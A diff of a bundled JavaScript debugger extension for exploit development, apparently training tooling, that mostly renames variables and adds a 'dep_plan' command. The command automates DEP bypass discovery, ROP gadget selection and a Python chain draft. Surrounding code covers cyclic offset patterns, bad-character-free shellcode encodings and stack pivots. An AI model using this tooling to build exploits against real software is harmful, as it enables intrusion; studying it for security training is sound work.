@@ -547,11 +547,11 @@ var osed_bundle = (() => {
   }
   function generateCyclicPattern(length) {
     const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-    const sequence = deBruijn(alphabet, 3);
-    if (length > sequence.length) {
-      throw new Error(`Cyclic pattern length ${length} exceeds the maximum unique-window length ${sequence.length}. Use a smaller length or the "msf" pattern type.`);
+    const sequence2 = deBruijn(alphabet, 3);
+    if (length > sequence2.length) {
+      throw new Error(`Cyclic pattern length ${length} exceeds the maximum unique-window length ${sequence2.length}. Use a smaller length or the "msf" pattern type.`);
     }
-    return sequence.slice(0, length);
+    return sequence2.slice(0, length);
   }
   function decodeOffsetNeedle(value) {
     if (typeof value === "number") {
@@ -2139,11 +2139,11 @@ var osed_bundle = (() => {
       return void 0;
     }
     const low = Number(__bi.and(raw, __bi(4294967295)));
-    const candidates2 = [
+    const candidates3 = [
       { kind: "msf", haystack: generateMsfPattern(Math.min(maxLen, 20280)) },
       { kind: "cyclic", haystack: generateCyclicPattern(Math.max(maxLen, 2e4)) }
     ];
-    for (const candidate of candidates2) {
+    for (const candidate of candidates3) {
       const needle = decodeOffsetNeedle(low);
       const offset = candidate.haystack.indexOf(needle);
       if (offset >= 0) {
@@ -2941,25 +2941,25 @@ var osed_bundle = (() => {
     const v = value >>> 0;
     const lo = v & 255;
     const hi = v >>> 8 & 255;
-    const candidates2 = [];
+    const candidates3 = [];
     if (v === 0)
-      candidates2.push([49, 192]);
+      candidates3.push([49, 192]);
     else if (v <= 127)
-      candidates2.push([106, v, 88]);
+      candidates3.push([106, v, 88]);
     else if (v <= 255)
-      candidates2.push([49, 192, 176, v]);
+      candidates3.push([49, 192, 176, v]);
     else if (v <= 65535 && lo === 0)
-      candidates2.push([49, 192, 180, hi]);
+      candidates3.push([49, 192, 180, hi]);
     else if (v <= 65535)
-      candidates2.push([49, 192, 102, 184, lo, hi]);
-    candidates2.push([184, ...dwordLE(v)]);
-    candidates2.push([184, ...dwordLE(~v >>> 0), 247, 208]);
-    return candidates2;
+      candidates3.push([49, 192, 102, 184, lo, hi]);
+    candidates3.push([184, ...dwordLE(v)]);
+    candidates3.push([184, ...dwordLE(~v >>> 0), 247, 208]);
+    return candidates3;
   }
   function movEax(value, badSet) {
     var _a2;
-    const candidates2 = movEaxCandidates(value);
-    return (_a2 = candidates2.find((c) => c.every((b) => b !== 0 && !badSet.has(b)))) != null ? _a2 : candidates2[0];
+    const candidates3 = movEaxCandidates(value);
+    return (_a2 = candidates3.find((c) => c.every((b) => b !== 0 && !badSet.has(b)))) != null ? _a2 : candidates3[0];
   }
   function ntaccessX86(tag, mov) {
     return [
@@ -3789,8 +3789,8 @@ var osed_bundle = (() => {
     const operands = instruction.operands.map((operand) => normalizeHexImmediate(operand)).join(", ");
     return operands.length > 0 ? `${instruction.mnemonic.toLowerCase()} ${operands}` : instruction.mnemonic.toLowerCase();
   }
-  function canonicalizeInstructionSequence(sequence) {
-    return sequence.instructions.map((instruction) => canonicalizeInstruction(instruction)).join(" | ");
+  function canonicalizeInstructionSequence(sequence2) {
+    return sequence2.instructions.map((instruction) => canonicalizeInstruction(instruction)).join(" | ");
   }
   function canonicalizeTextSequence(text) {
     return text.split(";").map((part) => part.trim()).filter((part) => part.length > 0).map((part) => normalizeInstructionText(part)).join(" | ");
@@ -4507,11 +4507,11 @@ var osed_bundle = (() => {
     return pop.mnemonic === "pop" && pop.operands.length === 1 && pop.operands[0].trim().toLowerCase() === register2 && ret.mnemonic === "ret";
   }
   function selectPopGadget(index, register2) {
-    const candidates2 = index.loadRegister(register2).filter((g) => isSinglePopRetLike(g, register2) && firstKnownAddress(g) !== void 0);
-    const plainRet = candidates2.filter((g) => retImmBytes(g) === 0).sort((a, b) => gadgetStability(a) - gadgetStability(b) || b.score - a.score)[0];
+    const candidates3 = index.loadRegister(register2).filter((g) => isSinglePopRetLike(g, register2) && firstKnownAddress(g) !== void 0);
+    const plainRet = candidates3.filter((g) => retImmBytes(g) === 0).sort((a, b) => gadgetStability(a) - gadgetStability(b) || b.score - a.score)[0];
     if (plainRet)
       return { gadget: plainRet, retImm: 0 };
-    const withImm = candidates2.filter((g) => retImmBytes(g) > 0).sort((a, b) => {
+    const withImm = candidates3.filter((g) => retImmBytes(g) > 0).sort((a, b) => {
       const stab = gadgetStability(a) - gadgetStability(b);
       if (stab !== 0)
         return stab;
@@ -4529,11 +4529,11 @@ var osed_bundle = (() => {
     return xor.mnemonic === "xor" && xor.operands.length === 2 && xor.operands[0].trim().toLowerCase() === register2 && xor.operands[1].trim().toLowerCase() === register2 && ret.mnemonic === "ret";
   }
   function selectZeroGadget(index, register2) {
-    const candidates2 = index.zeroRegister(register2).filter((g) => isZeroRetLike(g, register2) && firstKnownAddress(g) !== void 0);
-    const plainRet = candidates2.filter((g) => retImmBytes(g) === 0).sort((a, b) => b.score - a.score)[0];
+    const candidates3 = index.zeroRegister(register2).filter((g) => isZeroRetLike(g, register2) && firstKnownAddress(g) !== void 0);
+    const plainRet = candidates3.filter((g) => retImmBytes(g) === 0).sort((a, b) => b.score - a.score)[0];
     if (plainRet)
       return { gadget: plainRet, retImm: 0 };
-    const withImm = candidates2.filter((g) => retImmBytes(g) > 0).sort((a, b) => {
+    const withImm = candidates3.filter((g) => retImmBytes(g) > 0).sort((a, b) => {
       const diff = retImmBytes(a) - retImmBytes(b);
       return diff !== 0 ? diff : b.score - a.score;
     })[0];
@@ -5234,8 +5234,8 @@ var osed_bundle = (() => {
     const addr = firstKnownAddress(gadget);
     return addr === void 0 ? true : isAddressStable(addr);
   }
-  function selectBest(candidates2, preserve) {
-    const withAddr = candidates2.map((g) => ({ gadget: g, retImm: retImmBytes(g), effects: gadgetEffects(g) })).filter((s) => s.retImm >= 0 && s.retImm <= MAX_RET_IMM && firstKnownAddress(s.gadget) !== void 0).filter((s) => s.effects.safe).filter((s) => !preserve || !s.effects.clobbers.some((r) => preserve.has(r)));
+  function selectBest(candidates3, preserve) {
+    const withAddr = candidates3.map((g) => ({ gadget: g, retImm: retImmBytes(g), effects: gadgetEffects(g) })).filter((s) => s.retImm >= 0 && s.retImm <= MAX_RET_IMM && firstKnownAddress(s.gadget) !== void 0).filter((s) => s.effects.safe).filter((s) => !preserve || !s.effects.clobbers.some((r) => preserve.has(r)));
     if (withAddr.length === 0)
       return void 0;
     withAddr.sort((a, b) => {
@@ -5267,8 +5267,8 @@ var osed_bundle = (() => {
   }
   function findPopGadget(index, reg, preserve) {
     var _a2;
-    const candidates2 = (_a2 = index.capabilityMap.get(capKey("LOAD_REGISTER", reg))) != null ? _a2 : [];
-    const purePopRet = candidates2.filter((g) => {
+    const candidates3 = (_a2 = index.capabilityMap.get(capKey("LOAD_REGISTER", reg))) != null ? _a2 : [];
+    const purePopRet = candidates3.filter((g) => {
       var _a3;
       if (g.instructions.length < 2)
         return false;
@@ -5281,8 +5281,8 @@ var osed_bundle = (() => {
   }
   function findZeroGadget(index, reg, preserve) {
     var _a2;
-    const candidates2 = (_a2 = index.capabilityMap.get(capKey("ZERO_REGISTER", reg))) != null ? _a2 : [];
-    const pureXorRet = candidates2.filter((g) => {
+    const candidates3 = (_a2 = index.capabilityMap.get(capKey("ZERO_REGISTER", reg))) != null ? _a2 : [];
+    const pureXorRet = candidates3.filter((g) => {
       var _a3, _b;
       if (g.instructions.length !== 2)
         return false;
@@ -5293,9 +5293,9 @@ var osed_bundle = (() => {
   }
   function findUnaryGadget(index, kind, reg, preserve) {
     var _a2;
-    const candidates2 = (_a2 = index.capabilityMap.get(capKey(kind, reg))) != null ? _a2 : [];
+    const candidates3 = (_a2 = index.capabilityMap.get(capKey(kind, reg))) != null ? _a2 : [];
     const expected = OPERATION_MNEMONIC[kind];
-    const valid = candidates2.filter((g) => {
+    const valid = candidates3.filter((g) => {
       const last = g.instructions[g.instructions.length - 1];
       if ((last == null ? void 0 : last.mnemonic) !== "ret")
         return false;
@@ -5305,9 +5305,9 @@ var osed_bundle = (() => {
   }
   function findBinaryGadget(index, kind, dst, src, preserve) {
     var _a2;
-    const candidates2 = (_a2 = index.capabilityMap.get(capKey(kind, dst, src))) != null ? _a2 : [];
+    const candidates3 = (_a2 = index.capabilityMap.get(capKey(kind, dst, src))) != null ? _a2 : [];
     const expected = OPERATION_MNEMONIC[kind];
-    const valid = candidates2.filter((g) => {
+    const valid = candidates3.filter((g) => {
       const last = g.instructions[g.instructions.length - 1];
       if ((last == null ? void 0 : last.mnemonic) !== "ret")
         return false;
@@ -5693,9 +5693,9 @@ var osed_bundle = (() => {
       return addr === void 0 || addressBadcharFree(addr, bc);
     }));
     const MAX_RET_IMM2 = 64;
-    const candidates2 = workingIndex.gadgets.map((gadget) => ({ gadget, shape: analyzeGadget(gadget), address: firstKnownAddress(gadget), retImm: retImmBytes(gadget) })).filter((c) => c.address !== void 0 && c.retImm >= 0 && c.retImm <= MAX_RET_IMM2 && c.shape.safe && c.shape.popRegs.length > 0).map((c) => ({ gadget: c.gadget, shape: c.shape, address: c.address, retImm: c.retImm, score: c.gadget.score }));
+    const candidates3 = workingIndex.gadgets.map((gadget) => ({ gadget, shape: analyzeGadget(gadget), address: firstKnownAddress(gadget), retImm: retImmBytes(gadget) })).filter((c) => c.address !== void 0 && c.retImm >= 0 && c.retImm <= MAX_RET_IMM2 && c.shape.safe && c.shape.popRegs.length > 0).map((c) => ({ gadget: c.gadget, shape: c.shape, address: c.address, retImm: c.retImm, score: c.gadget.score }));
     const clobberFrequency = /* @__PURE__ */ new Map();
-    for (const c of candidates2) {
+    for (const c of candidates3) {
       for (const reg of c.shape.writes)
         clobberFrequency.set(reg, ((_a2 = clobberFrequency.get(reg)) != null ? _a2 : 0) + 1);
     }
@@ -5715,7 +5715,7 @@ var osed_bundle = (() => {
     while (pending.size > 0) {
       let best;
       let bestKey;
-      for (const candidate of candidates2) {
+      for (const candidate of candidates3) {
         if (!addressBadcharFree(candidate.address, bc))
           continue;
         let corrupts = false;
@@ -5777,7 +5777,7 @@ var osed_bundle = (() => {
       done.add(arith.register);
       ordered.push(arith.register);
     }
-    const unresolved = [...pending].map((reg) => ({ register: reg, reason: reasonFor(reg, workingIndex, candidates2, done, targetValues, badchars, bc) }));
+    const unresolved = [...pending].map((reg) => ({ register: reg, reason: reasonFor(reg, workingIndex, candidates3, done, targetValues, badchars, bc) }));
     const finalSteps = fixRetImmPadding(steps);
     return { steps: finalSteps, ordered, unresolved, stackBytes: finalSteps.length * 4, success: unresolved.length === 0 };
   }
@@ -5799,7 +5799,7 @@ var osed_bundle = (() => {
     }
     return best;
   }
-  function reasonFor(reg, index, candidates2, done, targetValues, badcharList, badchars) {
+  function reasonFor(reg, index, candidates3, done, targetValues, badcharList, badchars) {
     const buildableSomehow = solveValue(index, reg, targetValues.get(reg), badcharList) !== void 0;
     const buildablePreserving = solveValue(index, reg, targetValues.get(reg), badcharList, [...done]) !== void 0;
     if (buildableSomehow && !buildablePreserving) {
@@ -5808,7 +5808,7 @@ var osed_bundle = (() => {
     if (!buildableSomehow) {
       return `no pop/arithmetic construction found for ${hex32(targetValues.get(reg))} under these badchars and gadgets`;
     }
-    const setters = candidates2.filter((c) => c.shape.cleanPops.has(reg));
+    const setters = candidates3.filter((c) => c.shape.cleanPops.has(reg));
     if (setters.length === 0)
       return `no safe gadget cleanly pops ${reg}`;
     if (!isBadcharFree2(targetValues.get(reg), badchars)) {
@@ -6115,7 +6115,7 @@ var osed_bundle = (() => {
     return [chain.popPtr, chain.deref, chain.dispatch].filter((g) => isAddressStable(firstKnownAddress(g))).length;
   }
   function findDerefChain(index) {
-    const candidates2 = [];
+    const candidates3 = [];
     for (const valReg of REGS) {
       const dispatch = findJmp(index, valReg);
       if (!dispatch)
@@ -6124,12 +6124,12 @@ var osed_bundle = (() => {
         const deref = findMemLoad(index, valReg, ptrReg);
         const popPtr = findPop(index, ptrReg);
         if (deref && popPtr)
-          candidates2.push({ popPtr, deref, dispatch, ptrReg, valReg });
+          candidates3.push({ popPtr, deref, dispatch, ptrReg, valReg });
       }
     }
-    if (candidates2.length === 0)
+    if (candidates3.length === 0)
       return void 0;
-    return candidates2.sort((a, b) => {
+    return candidates3.sort((a, b) => {
       if (stableCount(a) !== stableCount(b))
         return stableCount(b) - stableCount(a);
       const selfA = a.ptrReg === a.valReg ? 0 : 1;
@@ -6243,7 +6243,7 @@ var osed_bundle = (() => {
     return left !== void 0 && normalize(left) === normalize(right);
   }
   function planApiResolution(target, imports, badchars = []) {
-    const candidates2 = [];
+    const candidates3 = [];
     for (const entry of imports) {
       const pointerResolved = entry.pointer !== __bi(0);
       const targetModuleVerified = sameModule(entry.actualModule, target.module) && entry.actualModuleBase !== void 0;
@@ -6262,7 +6262,7 @@ var osed_bundle = (() => {
       };
       if (entry.importedSymbol.toLowerCase() === target.symbol.toLowerCase()) {
         const exportRvaVerified = targetModuleVerified && exactExport;
-        candidates2.push(__spreadProps(__spreadValues({}, base), {
+        candidates3.push(__spreadProps(__spreadValues({}, base), {
           strategy: "direct-slot",
           state: exportRvaVerified && slotPayloadSafe ? "ENCODABLE" : exportRvaVerified ? "ADDRESS_VALIDATED" : "DISCOVERED",
           exportRvaVerified,
@@ -6274,7 +6274,7 @@ var osed_bundle = (() => {
       if (!targetModuleVerified || !anchorExact || !pointerResolved)
         continue;
       const delta = __bi.and(target.address - entry.pointer, __bi(4294967295));
-      candidates2.push(__spreadProps(__spreadValues({}, base), {
+      candidates3.push(__spreadProps(__spreadValues({}, base), {
         strategy: "derived-address",
         state: slotPayloadSafe ? "ENCODABLE" : "ADDRESS_VALIDATED",
         exportRvaVerified: true,
@@ -6282,7 +6282,7 @@ var osed_bundle = (() => {
         recommendation: slotPayloadSafe ? "Candidate for gadget feasibility analysis; no chain has been constructed." : "Anchor is validated but its slot requires address construction before gadget feasibility analysis."
       }));
     }
-    return candidates2.sort((left, right) => {
+    return candidates3.sort((left, right) => {
       const strategy = left.strategy === right.strategy ? 0 : left.strategy === "direct-slot" ? -1 : 1;
       if (strategy !== 0)
         return strategy;
@@ -6430,9 +6430,9 @@ var osed_bundle = (() => {
       notes
     };
   }
-  function buildBestApiResolution(index, candidates2, options = {}) {
+  function buildBestApiResolution(index, candidates3, options = {}) {
     var _a2;
-    const attempts = candidates2.map((candidate) => {
+    const attempts = candidates3.map((candidate) => {
       if (!candidate.exportRvaVerified || !candidate.pointerResolved || !candidate.targetModuleVerified) {
         return { candidate, rejectionReasons: ["Phase 1 address evidence is incomplete."] };
       }
@@ -6818,14 +6818,14 @@ var osed_bundle = (() => {
     return { source: "memory", clobbers: ["esp"] };
   }
   function selectPivotGadget(index, state) {
-    const candidates2 = index.gadgets.filter((g) => g.capabilities.some((c) => c.kind === "STACK_PIVOT") && firstKnownAddress(g) !== void 0).sort((a, b) => {
+    const candidates3 = index.gadgets.filter((g) => g.capabilities.some((c) => c.kind === "STACK_PIVOT") && firstKnownAddress(g) !== void 0).sort((a, b) => {
       const aLen = a.instructions.length;
       const bLen = b.instructions.length;
       if (aLen !== bLen)
         return aLen - bLen;
       return b.score - a.score;
     });
-    for (const gadget of candidates2) {
+    for (const gadget of candidates3) {
       const addr = firstKnownAddress(gadget);
       const { source, sourceRegister, adjustment, clobbers } = classifyPivotSource(gadget);
       if (source === "register" && sourceRegister) {
@@ -7524,7 +7524,7 @@ var osed_bundle = (() => {
   var X86_REGS = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp", "esp"];
   function simulateGadget(gadget, regs, steps, currentIndex) {
     var _a2, _b, _c, _d, _e, _f, _g, _h, _i;
-    const sideEffects = [];
+    const sideEffects2 = [];
     const popTargets = [];
     let consumed = 0;
     for (const instr of gadget.instructions) {
@@ -7545,7 +7545,7 @@ var osed_bundle = (() => {
             popTargets.push({ reg, stepIndex: targetIdx });
           } else {
             regs[reg] = "? (past end of chain)";
-            sideEffects.push(`pop ${reg} reads past chain end`);
+            sideEffects2.push(`pop ${reg} reads past chain end`);
           }
         }
       } else if (m === "xchg") {
@@ -7554,7 +7554,7 @@ var osed_bundle = (() => {
           const tmp = (_b = regs[a]) != null ? _b : "?";
           regs[a] = (_c = regs[b]) != null ? _c : "?";
           regs[b] = tmp;
-          sideEffects.push(`xchg ${a}, ${b}`);
+          sideEffects2.push(`xchg ${a}, ${b}`);
         }
       } else if (m === "mov") {
         const dst = ops[0];
@@ -7562,20 +7562,20 @@ var osed_bundle = (() => {
         if (dst && src) {
           if (X86_REGS.includes(dst) && X86_REGS.includes(src)) {
             regs[dst] = (_d = regs[src]) != null ? _d : "?";
-            sideEffects.push(`${dst} \u2190 ${src} (${(_e = regs[src]) != null ? _e : "?"})`);
+            sideEffects2.push(`${dst} \u2190 ${src} (${(_e = regs[src]) != null ? _e : "?"})`);
           } else if (X86_REGS.includes(dst)) {
             const match = /\[(e[a-z]{2})\]/.exec(src);
             if (match) {
               const ptrReg = match[1];
               regs[dst] = `*[${(_f = regs[ptrReg]) != null ? _f : ptrReg}]`;
-              sideEffects.push(`${dst} \u2190 *[${ptrReg}] (runtime deref)`);
+              sideEffects2.push(`${dst} \u2190 *[${ptrReg}] (runtime deref)`);
             } else {
               regs[dst] = "?";
             }
           } else {
             const dstMatch = /\[(e[a-z]{2})\]/.exec(dst);
             if (dstMatch && X86_REGS.includes(src)) {
-              sideEffects.push(`*[${dstMatch[1]}] \u2190 ${src} (${(_g = regs[src]) != null ? _g : "?"})`);
+              sideEffects2.push(`*[${dstMatch[1]}] \u2190 ${src} (${(_g = regs[src]) != null ? _g : "?"})`);
             }
           }
         }
@@ -7591,16 +7591,16 @@ var osed_bundle = (() => {
           } else {
             regs[reg] = "?";
           }
-          sideEffects.push(`${m} ${reg}, ${ops[1]}`);
+          sideEffects2.push(`${m} ${reg}, ${ops[1]}`);
         }
       } else if (m === "xor") {
         const [a, b] = ops;
         if (a === b && X86_REGS.includes(a)) {
           regs[a] = hex323(0);
-          sideEffects.push(`${a} \u2190 0 (xor self)`);
+          sideEffects2.push(`${a} \u2190 0 (xor self)`);
         } else if (a && X86_REGS.includes(a)) {
           regs[a] = "?";
-          sideEffects.push(`xor ${a}, ${b} (clobber)`);
+          sideEffects2.push(`xor ${a}, ${b} (clobber)`);
         }
       } else if (m === "neg" || m === "not" || m === "inc" || m === "dec") {
         const reg = ops[0];
@@ -7620,23 +7620,23 @@ var osed_bundle = (() => {
           } else {
             regs[reg] = "?";
           }
-          sideEffects.push(`${m} ${reg}`);
+          sideEffects2.push(`${m} ${reg}`);
         }
       } else if (m === "jmp") {
-        sideEffects.push(`jmp ${ops[0]} (dispatch)`);
+        sideEffects2.push(`jmp ${ops[0]} (dispatch)`);
         break;
       } else if (m === "push") {
         if (ops[0] && X86_REGS.includes(ops[0])) {
-          sideEffects.push(`push ${ops[0]} (${(_i = regs[ops[0]]) != null ? _i : "?"})`);
+          sideEffects2.push(`push ${ops[0]} (${(_i = regs[ops[0]]) != null ? _i : "?"})`);
         }
       } else if (m === "nop" || m === "int3") {
       } else {
         if (ops[0] && X86_REGS.includes(ops[0])) {
-          sideEffects.push(`${instr.originalText} (may clobber ${ops[0]})`);
+          sideEffects2.push(`${instr.originalText} (may clobber ${ops[0]})`);
         }
       }
     }
-    return { consumed, sideEffects, popTargets };
+    return { consumed, sideEffects: sideEffects2, popTargets };
   }
   function analyzeRuntime(input) {
     var _a2, _b;
@@ -7694,13 +7694,13 @@ var osed_bundle = (() => {
           i++;
           continue;
         }
-        const { consumed, sideEffects, popTargets } = simulateGadget(gadget, regs, steps, i);
+        const { consumed, sideEffects: sideEffects2, popTargets } = simulateGadget(gadget, regs, steps, i);
         for (const { reg, stepIndex } of popTargets) {
           const writes2 = (_a2 = registerWrites.get(reg)) != null ? _a2 : [];
           writes2.push(stepIndex);
           registerWrites.set(reg, writes2);
         }
-        for (const effect of sideEffects) {
+        for (const effect of sideEffects2) {
           const match = /^(e[a-z]{2}) ←/.exec(effect);
           if (match) {
             const writes2 = (_b = registerWrites.get(match[1])) != null ? _b : [];
@@ -7715,7 +7715,7 @@ var osed_bundle = (() => {
           action: `GADGET: ${instrText}`,
           kind: "gadget",
           registersAfter: cloneRegs(regs),
-          sideEffects,
+          sideEffects: sideEffects2,
           notes: []
         });
         for (let p = 0; p < consumed; p++) {
@@ -8763,8 +8763,8 @@ var osed_bundle = (() => {
       registerTransforms: initialRegisterTransforms()
     };
   }
-  function composeSemanticSequence(sequence) {
-    const instructionSemantics = sequence.instructions.map((instruction, index) => analyzeInstruction(instruction, index));
+  function composeSemanticSequence(sequence2) {
+    const instructionSemantics = sequence2.instructions.map((instruction, index) => analyzeInstruction(instruction, index));
     const summary = makeSummary();
     for (const semantic of instructionSemantics) {
       summary.reads = appendField(summary.reads, semantic.reads);
@@ -8777,19 +8777,19 @@ var osed_bundle = (() => {
     }
     summary.stackDelta = aggregateStackDelta(instructionSemantics);
     summary.registerTransforms = aggregateRegisterTransforms(instructionSemantics);
-    const capture = balancedEspCapture(sequence.instructions);
+    const capture = balancedEspCapture(sequence2.instructions);
     if (capture)
       summary.registerTransforms[capture] = registerIdentity("esp");
     return {
       schemaVersion: SEMANTIC_SCHEMA_VERSION,
-      instructionSequenceId: sequence.id,
-      instructionSequence: sequence,
+      instructionSequenceId: sequence2.id,
+      instructionSequence: sequence2,
       instructionSemantics,
       summary
     };
   }
-  function canonicalizeSequenceForPolicy(sequence) {
-    return canonicalizeInstructionSequence(sequence);
+  function canonicalizeSequenceForPolicy(sequence2) {
+    return canonicalizeInstructionSequence(sequence2);
   }
 
   // src/semantics/live-provider.ts
@@ -8846,13 +8846,13 @@ var osed_bundle = (() => {
     };
   }
   function descriptorFromLive(address, instructions) {
-    const sequence = sequenceFromLiveHit({ address, mnemonic: instructions.join(" ; ") });
-    const semantic = composeSemanticSequence(sequence);
+    const sequence2 = sequenceFromLiveHit({ address, mnemonic: instructions.join(" ; ") });
+    const semantic = composeSemanticSequence(sequence2);
     return {
       address,
       semantic,
       capabilities: deriveCapabilities(semantic, []),
-      instructions: sequence.instructions.map((instruction) => instruction.normalizedText || instruction.originalText)
+      instructions: sequence2.instructions.map((instruction) => instruction.normalizedText || instruction.originalText)
     };
   }
   function hasExactFlow2(semantic) {
@@ -8952,7 +8952,7 @@ var osed_bundle = (() => {
     return descriptor.capabilities.find((entry) => entry.kind === kind);
   }
   function combineSemantics(first, second) {
-    const sequence = __spreadProps(__spreadValues({}, first.semantic.instructionSequence), {
+    const sequence2 = __spreadProps(__spreadValues({}, first.semantic.instructionSequence), {
       id: `${first.semantic.instructionSequence.id}+${second.semantic.instructionSequence.id}`,
       originalText: `${first.semantic.instructionSequence.originalText} ; ${second.semantic.instructionSequence.originalText}`,
       instructions: [
@@ -8960,7 +8960,7 @@ var osed_bundle = (() => {
         ...second.semantic.instructionSequence.instructions
       ]
     });
-    return composeSemanticSequence(sequence);
+    return composeSemanticSequence(sequence2);
   }
   function memoryReadTarget(descriptor, register2) {
     const transform = descriptor.semantic.summary.registerTransforms[register2];
@@ -10359,7 +10359,7 @@ var osed_bundle = (() => {
     var _a2, _b, _c, _d, _e, _f;
     const instructions = stored.instructions.map((instruction) => parseInstruction(instruction));
     const firstLocation = (_a2 = stored.locations[0]) != null ? _a2 : {};
-    const sequence = {
+    const sequence2 = {
       schemaVersion: SEMANTIC_SCHEMA_VERSION,
       id: `corpus:${stored.instructions.join(" ; ")}`,
       source: {
@@ -10381,12 +10381,12 @@ var osed_bundle = (() => {
         rebaseable: (_f = firstLocation.rebaseable) != null ? _f : "UNKNOWN"
       }
     };
-    const semanticSummary = composeSemanticSequence(sequence);
+    const semanticSummary = composeSemanticSequence(sequence2);
     const classification = buildRopGadget(semanticSummary);
     const scoring = scoreSemanticSequence(semanticSummary, classification.categories);
     return {
       schemaVersion: ROP_SCHEMA_VERSION,
-      canonicalId: canonicalizeSequenceForPolicy(sequence),
+      canonicalId: canonicalizeSequenceForPolicy(sequence2),
       instructions,
       locations: stored.locations,
       semanticSummary,
@@ -10533,29 +10533,29 @@ var osed_bundle = (() => {
   }
 
   // src/rop/index.ts
-  function locationFromSequence(sequence) {
+  function locationFromSequence(sequence2) {
     return {
-      module: sequence.provenance.module,
-      section: sequence.provenance.section,
-      virtualAddress: sequence.provenance.virtualAddress,
-      fileOffset: sequence.provenance.fileOffset,
-      executable: sequence.provenance.executable,
-      writable: sequence.provenance.writable,
-      aslr: sequence.provenance.aslr,
-      rebaseable: sequence.provenance.rebaseable,
-      source: sequence.source.name
+      module: sequence2.provenance.module,
+      section: sequence2.provenance.section,
+      virtualAddress: sequence2.provenance.virtualAddress,
+      fileOffset: sequence2.provenance.fileOffset,
+      executable: sequence2.provenance.executable,
+      writable: sequence2.provenance.writable,
+      aslr: sequence2.provenance.aslr,
+      rebaseable: sequence2.provenance.rebaseable,
+      source: sequence2.source.name
     };
   }
-  function buildRopGadgetFromSequence(sequence) {
-    const semanticSummary = composeSemanticSequence(sequence);
+  function buildRopGadgetFromSequence(sequence2) {
+    const semanticSummary = composeSemanticSequence(sequence2);
     const classification = buildRopGadget(semanticSummary);
     const scoring = scoreSemanticSequence(semanticSummary, classification.categories);
     const capabilities = deriveCapabilities(semanticSummary, classification.categories);
     return {
       schemaVersion: ROP_SCHEMA_VERSION,
-      canonicalId: canonicalizeSequenceForPolicy(sequence),
-      instructions: sequence.instructions,
-      locations: [locationFromSequence(sequence)],
+      canonicalId: canonicalizeSequenceForPolicy(sequence2),
+      instructions: sequence2.instructions,
+      locations: [locationFromSequence(sequence2)],
       semanticSummary,
       categories: classification.categories,
       score: scoring.score,
@@ -10577,7 +10577,7 @@ var osed_bundle = (() => {
     return [...byCanonicalId.values()];
   }
   function buildRopIndexFromSequences(sequences) {
-    const gadgets = dedupeRopGadgets([...sequences].map((sequence) => buildRopGadgetFromSequence(sequence)));
+    const gadgets = dedupeRopGadgets([...sequences].map((sequence2) => buildRopGadgetFromSequence(sequence2)));
     const byCanonicalId = /* @__PURE__ */ new Map();
     for (const gadget of gadgets) {
       byCanonicalId.set(gadget.canonicalId, gadget);
@@ -11153,7 +11153,7 @@ var osed_bundle = (() => {
     { sequence: "mov rsp, rax ; ret", bytes: [72, 137, 196, 195] },
     { sequence: "leave ; ret", bytes: [201, 195] }
   ];
-  function buildSequence(address, sequence) {
+  function buildSequence(address, sequence2) {
     const moduleInfo = findModuleByAddress(address);
     const provenance2 = {
       module: moduleInfo == null ? void 0 : moduleInfo.name,
@@ -11173,10 +11173,10 @@ var osed_bundle = (() => {
     };
     return {
       schemaVersion: SEMANTIC_SCHEMA_VERSION,
-      id: `pivot:${sequence}:${address.toString(16)}`,
+      id: `pivot:${sequence2}:${address.toString(16)}`,
       source,
-      originalText: sequence,
-      instructions: sequence.split(" ; ").map((part) => parseInstruction(part)),
+      originalText: sequence2,
+      instructions: sequence2.split(" ; ").map((part) => parseInstruction(part)),
       provenance: provenance2
     };
   }
@@ -11415,6 +11415,19 @@ var osed_bundle = (() => {
       usage: "dx @$osed().rop.api_build(target, badchars?, continuation?, preserve?, maxGadgets?, owner?, anchor?)",
       examples: ['dx @$osed().rop.api_build("KERNEL32!WriteProcessMemory", "00 0A 0D", 0x10064A0F, "", 12, "libspp.dll", "QueryDosDeviceA")'],
       seeAlso: ["rop.api_plan", "rop.construct", "rop.verify", "rop.prove"]
+    },
+    {
+      name: "dep_plan",
+      summary: "Whole DEP bypass discovery in seven sections",
+      description: "Runs the DEP bypass discovery for VirtualAlloc, VirtualProtect or WriteProcessMemory in one command. Each step prints under its own [n/7] header: module protections, IAT slot, gadget corpus, the best 3 gadgets per job with side effects, clean constants, the frame or PUSHAD map, and a Python draft to verify field by field.",
+      usage: "dx @$osed().dep_plan(api, module, badchars, style?)",
+      examples: [
+        'dx @$osed().dep_plan("VirtualAlloc", "libbkup", "00 09 0A 0B 0C 0D 20")',
+        'dx @$osed().dep_plan("VirtualProtect", "libbkup", "00 0A 0D", "pushad")',
+        'dx @$osed().dep_plan("WriteProcessMemory", "libbkup", "00 0A 0D")'
+      ],
+      details: "The draft is not a finished chain. It fills in the top-ranked gadget per job and marks with TODO the distances only a debugger run can give, with the commands that measure them. It does not check that one gadget's output register is the next gadget's input.",
+      seeAlso: ["rop.scan_live", "rop.query", "rop.construct"]
     },
     {
       name: "rop.query",
@@ -11886,10 +11899,10 @@ var osed_bundle = (() => {
         value = true ? "1.0.4" : globalThis[key2];
         break;
       case "__OSED_BUILD_TIME__":
-        value = true ? "2026-11-21T11:44:48.761Z" : globalThis[key2];
+        value = true ? "2026-11-21T12:02:35.264Z" : globalThis[key2];
         break;
       case "__OSED_GIT_COMMIT__":
-        value = true ? "dcc13681c3a0" : globalThis[key2];
+        value = true ? "a26e21fbb320" : globalThis[key2];
         break;
     }
     return typeof value === "string" && value.length > 0 ? value : fallback;
@@ -12088,7 +12101,7 @@ var osed_bundle = (() => {
   var categoryForName = (name) => {
     if (SHELLCODE_WRITERS.includes(name))
       return "shellcode";
-    if (name.startsWith("rop") || name === "dep_function" || name === "retn" || name === "add_esp" || name === "pivots")
+    if (name.startsWith("rop") || name === "dep_function" || name === "dep_plan" || name === "retn" || name === "add_esp" || name === "pivots")
       return "rop";
     if (name === "seh" || name === "seh_ppr" || name.startsWith("seh."))
       return "seh";
@@ -12160,6 +12173,7 @@ var osed_bundle = (() => {
     rop_suggest: "Suggest exploit-friendly gadget patterns",
     rop_template: "Print a commented ROP chain skeleton (skeleton or PUSHAD style)",
     dep_function: "Print a VirtualAlloc, VirtualProtect or WriteProcessMemory call-frame skeleton",
+    dep_plan: "Run the whole DEP bypass discovery in seven sections",
     pivots: "Scan for stack pivot candidates",
     retn: "Scan for retn N gadgets",
